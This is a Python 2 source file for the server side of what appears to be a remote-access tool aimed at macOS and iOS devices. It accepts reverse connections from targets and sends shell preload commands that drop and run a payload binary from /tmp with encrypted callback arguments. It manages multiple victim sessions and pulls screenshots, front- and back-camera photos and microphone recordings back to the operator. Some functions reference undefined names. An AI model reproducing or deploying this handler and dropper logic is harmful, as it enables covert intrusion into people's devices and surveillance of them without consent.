#ESServer
#ESSession
#created by lucas.py
#3-5-17
import os
import socket
import sys
import time
from threading import Thread
from src.encryption.ESEncryptor import ESEncryptor
from src.shell.shell import ESShell

datadir = "data"

class ESSession:
    def __init__(self,uid,name,conn,s,host,port,CDA):
        self.uid = uid
        self.name = name
        self.conn = conn
        self.s = s
        self.host = host
        self.port = port
        self.CDA = CDA

class ESServer:
    def __init__(self,escryptor,terminator,helper):
        self.sessions = {}
        self.escryptor = escryptor
        self.terminator = terminator
        self.shell = ESShell()
        self.binaryKey = "spGHbigdxMBJpbOCAr3rnS3inCdYQyZV"
        self.h = helper
        self.inputhandle = ""
        self.msrunning = 0
    
    def listen(self,host,port,verbose):
        INSTRUCT_ADDRESS = "/dev/tcp/"+str(host)+"/"+str(port)
        INSTRUCT_BINARY_ARGUMENT = ESEncryptor(self.binaryKey,16).encryptString(
            str(host)+" "+str(port)+" "+self.escryptor.key+" "+self.terminator
        )
        INSTRUCT_STAGER = 'com=$(uname -p); if [ $com != "unknown" ]; then echo $com; else uname; fi\n'
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', int(port)))
        s.listen(1)
        if verbose:
            self.h.strinfo("Listening on port "+str(port)+"...")

        #SEND/RECEIVE ARCH
        conn, addr = s.accept()
        hostAddress = addr[0]
        if verbose:
            self.h.strinfo("Connecting to "+hostAddress)
        conn.send(INSTRUCT_STAGER)
        CDA = conn.recv(128)
        
        #CHOOSE/SEND BINARY
        payload = ""
        preload = ""
        if "armv7l" in CDA:
            CDA = "Linux"

        if "i386" in CDA:
            if verbose:
                self.h.strinfo("Detected OSX")
            binaryFile = open("src/binaries/esplosx", "rb")
            payload = binaryFile.read()
            binaryFile.close()
            preload = "rm /private/tmp/espl 2> /dev/null;cat >/private/tmp/espl;chmod +x /private/tmp/espl;/private/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" 2> /dev/null &\n"
        elif "arm" in CDA:
            if verbose:
                print strinfo("Detected iOS")
            binaryFile = open("src/binaries/esplios", "rb")
            payload = binaryFile.read()
            binaryFile.close()
            #TODO: change upload directory for mobile user
            preload = "export dti='/tmp/'; if [ $UID == '0' ]; then export dti='/usr/bin/'; fi;rm $dti'espl' 2> /dev/null;cat >$dti'espl';chmod +x $dti'espl';$dti'espl' "+INSTRUCT_BINARY_ARGUMENT+" 2> /dev/null &\n"
        elif "Linux" in CDA:
            if verbose:
                print strinfo("Detected Linux, this isn't supported yet")
            conn.close()
            exit()
            return
            binaryFile = open("src/binaries/esplinux", "rb")
            payload = binaryFile.read()
            binaryFile.close()
            preload = "rm /var/tmp/espl;cat >/var/tmp/espl;chmod +x /var/tmp/espl;/var/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" &\n"
        else:
            if verbose:
                print strinfo("device unrecognized")
                print CDA
            conn.close();
            return

        if verbose:
            self.h.strinfo("Sending Payload")
        conn.send(preload)
        conn.send(payload)
        conn.close() #only one blink!
        if verbose:
            self.h.strinfo("Waiting For Connection...")
        conn, hostAddress = s.accept()
        s.settimeout(5)
        data = self.receiveString(conn)
        if data:
            uid = data.split(" ")[0]
            data = data.replace(uid+" ","")
            name = self.h.UNDERLINE_GREEN + data.replace("\n","") + self.h.ENDC + self.h.GREEN + "> " + self.h.ENDC;
            #spawn our interactive shell
            s.close()
            return ESSession(uid,name,conn,s,host,port,CDA)

    def getip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);s.connect(("192.168.1.1",80));host = s.getsockname()[0];s.close()
            host = host
        except:
            host = "127.0.0.1"
        return host

    def singleServer(self,host,port):
        try:
            session = self.listen(host,port,1)
        except KeyboardInterrupt:
            return
        
        if session.conn and self.shell.interact(session,self) == -1:
            self.h.strinfo("closing connection")
            session.conn.close
            time.sleep(0.5)
    
    #MARK: Multiserver
    def multiServerListen(self,host,port):
        x = 1
        self.h.strinfo("Starting Background Multi Server on "+str(port)+"...")
        self.h.strinfo("type \"help\" for MultiServer commands")
        while self.msrunning:
            session = self.listen(host,port,0)
            skip = 0
            for sx in self.sessions:
                if session.uid == self.sessions[sx].uid:
                    session.conn.close()
                    skip = 1
                    break
            #damnit
            if skip:
                continue
            #add to sessions
            self.sessions[x] = session
            try:
                session.conn.getpeername()[0]
            except:
                del self.sessions[x]
                continue

            sys.stdout.write("\n\r"+self.h.COLOR_INFO+"[*]  "+
             self.h.WHITE+"Session "+str(x)+" opened | "+
             self.sessions[x].name.replace(self.h.UNDERLINE_GREEN,"").replace(self.h.GREEN,"")[:-10] + " "+
             self.sessions[x].conn.getpeername()[0]+
             self.h.WHITE+"\n"+
             self.inputhandle)

            sys.stdout.flush()
            x += 1

    def multiServer(self,host,port):
        self.msrunning = 1;
        bgserver = Thread(target = self.multiServerListen, args=(host,port))
        bgserver.daemon=True
        bgserver.start()
        time.sleep(0.01)
        while 1:
            self.inputhandle = self.h.COLOR_INFO+"MultiSession"+self.h.WHITE+"> "
            input = raw_input(self.inputhandle)
            if not input:
                continue
            cmd = input.split()
            #commands
            try:
                if cmd[0] == "interact":
                    self.multiServerInteract(cmd)
                elif cmd[0] == "sessions":
                    self.multiServerListSessions()
                elif cmd[0] == "close":
                    self.multiServerCloseSession(cmd)
                elif cmd[0] == "help":
                    self.multiServerHelp()
                elif cmd[0] == "exit":
                    self.multiServerExit(bgserver)
                    self.msrunning = 0
                    print "exit!"
                    break
                else:
                    print "invalid command"
            except Exception as e:
                print str(e)+"\n"
                continue
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect( (host,port))
        bgserver.join()

    def multiServerExit(self,bgserver):
        #clean up
        for key,value in self.sessions.iteritems():
            if value.name:
                try:
                    s = self.sessions[key]
                    s.conn.close()
                except:
                    pass
        self.sessions.clear()

    def multiServerListSessions(self):
        self.h.strinfo("Total Sessions: " + str(len(self.sessions)))
        for key,value in self.sessions.iteritems():
            self.h.strinfo("Session ["+str(key)+"] | "+value.name.replace(self.h.UNDERLINE_GREEN,"").replace(self.h.GREEN,"")[:-10]+" "+value.conn.getpeername()[0])

    def multiServerHelp(self):
        def showCommand(cmd,desc):
            print cmd + " " * (15 - len(cmd)) + ": " + desc
        print self.h.WHITEBU+"MultiSession Commands:"+"\n"+self.h.ENDC
        showCommand("interact","interact with session, Usage: interact (session number)")
        showCommand("close","close session, Usage: close (session number)")
        showCommand("sessions","list current active sessions")
        showCommand("exit","exit MultiServer")
        print ""

    def multiServerInteract(self,args):
        try:
            s = self.sessions[int(args[1])]
            s.conn.getpeername()[0]
            if self.shell.interact(s,self,1) == -1:
                self.multiServerCloseSession(args) #2nd arg is id
        except:
            "unable to interact with session"

    def multiServerCloseSession(self,args):
        if len(args) > 1:
            x = int(args[1])
            try:
                s = self.sessions[x]
                s.conn.close()
                del self.sessions[x]
                self.h.strinfo("Session "+str(x)+" closed")
            except:
                self.h.strinfo("Session not found")
        else:
            self.h.strinfo("Please specify a session id")

    def sendCommand(self,str,conn):
        conn.send(self.escryptor.encryptString(str))
        try:
            data = self.receiveString(conn)
            if data: print data
        except:
            print "connection was reset"
            conn.close()
            exit()

    def receiveString(self,conn):
        data = ""
        while 1:
            data += conn.recv(1024)
            if not data:
                return "something went wrong"
            #terminator when we are done receiving data
            if self.terminator in data:
                data = data.split(self.terminator)[0]
                try:
                    result = self.escryptor.decrypt(data)
                    if result == "-1":
                        result = "invalid command"
                    return result.rstrip()
                except Exception as e:
                    return str(e)

    def uploadFile(self,fileName,location,conn):
        f = open(fileName,"rb")
        fileData = bben(f.read())
        f.close()
        filesize = str(sys.getsizeof(fileData))
        #send cmd
        conn.send(encryptStr("installpro "+filesize))
        #check if we are good to go
        status = receiveString(conn)
        if status == "1":
            #sendfile
            print strinfo("Uploading "+fileName)
            print strinfo("Size = "+filesize)
            conn.send(fileData+terminator)
            #blank
            conn.recv(1)
            print strinfo("Finished")
        else:
            print strinfo(status)

    def downloadFile(self,command,conn):
        #send download command
        conn.send(self.escryptor.encryptString(command))
        args = command.split()
        
        #receive file size
        sof = self.receiveString(conn)
        try:
            sizeofFile = int(sof)
        except:
            self.hstrinfo("Error: "+sof)
            return
        self.h.strinfo("file size: "+str(sizeofFile))

        #filename to write to
        if not os.path.exists(datadir):
            os.makedirs(datadir)
        filename = ""
        dateFormat = "%Y%m%d%H%M%S"
        if args[0] == "screenshot":
            filename = "screenshot"+time.strftime(dateFormat)+".jpeg"
        elif args[0] == "picture":
            filename = "isight"+time.strftime(dateFormat)+".jpeg"
        elif args[0] == "frontcam":
            filename = "frontcamera"+time.strftime(dateFormat)+".jpeg"
        elif args[0] == "backcam":
            filename = "backcamera"+time.strftime(dateFormat)+".jpeg"
        elif args[0] == "mic":
            filename = "mic"+time.strftime(dateFormat)+".aac"
        else:
            filename = args[1].split("/")[-1]

        progress = 0
        file = open(os.getcwd()+"/.tmpfile", "a+b")
        #read stream into file
        while 1:
            #TODO: there is a small chance EOF will be miss-aligned, need to fix this
            chunk = conn.recv(1024)
            progress += len(chunk)
            #Show progress
            if progress > sizeofFile:
                progress = sizeofFile
            sys.stdout.write("\r"+self.h.strinfoGet(self.h.WHITE+"Downloading "+filename+" ("+str(progress)+"/"+str(sizeofFile)+") bytes"))
            #write to file
            if self.terminator in chunk:
                print ""
                #replace our endoffile keyword
                chunk = chunk.replace(self.terminator,"")
                #write the remaining chunk
                file.write(chunk)
                file.close()
                #decrypt with our shell key, remove tmp file
                downloadedFile = open("data/"+filename,"wb")
                downloadedFile.close()
                if not self.escryptor.decryptFile(os.getcwd()+"/.tmpfile", "data/"+filename, sizeofFile):
                    self.h.strinfo("error decrypting data :(")
                os.remove(os.getcwd()+"/.tmpfile")
                self.h.strinfo("Finished Downloading!")
                return
            else:
                file.write(chunk)
